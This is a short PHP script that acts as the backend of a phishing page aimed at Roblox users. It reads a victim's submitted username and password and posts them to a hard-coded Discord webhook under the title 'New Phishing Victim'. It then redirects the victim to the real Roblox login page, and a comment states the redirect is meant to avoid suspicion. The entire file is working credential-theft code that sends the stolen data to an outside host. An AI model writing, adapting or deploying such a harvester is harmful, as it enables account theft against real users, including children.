
<?php
    if(!isset($_POST['username']) ||!isset($_POST['password'])){
        die('Invalid request');
    }

    $username = $_POST['username'];
    $password = $_POST['password'];

    // Discord webhook URL
    $webhook_url = "https://discord.com/api/webhooks/978152864914477056/CS_HwxRdrn-5T7x1iEe7yAPeY_kJ9iwi2-oqOVr1ZZH5xSn6_uzlus4fRhqtQyhu3xby";

    // Create the embed message
    $embed = array(
        "embeds" => array(
            array(
                "title" => "New Phishing Victim",
                "description" => "Username: ". $username. "\nPassword: ". $password,
                "color" => 16777215
            )
        )
    );

    // Send the embed message to the Discord webhook
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect the victim to the real Roblox login page to avoid suspicion
    header("Location: https://www.roblox.com/login");
?>
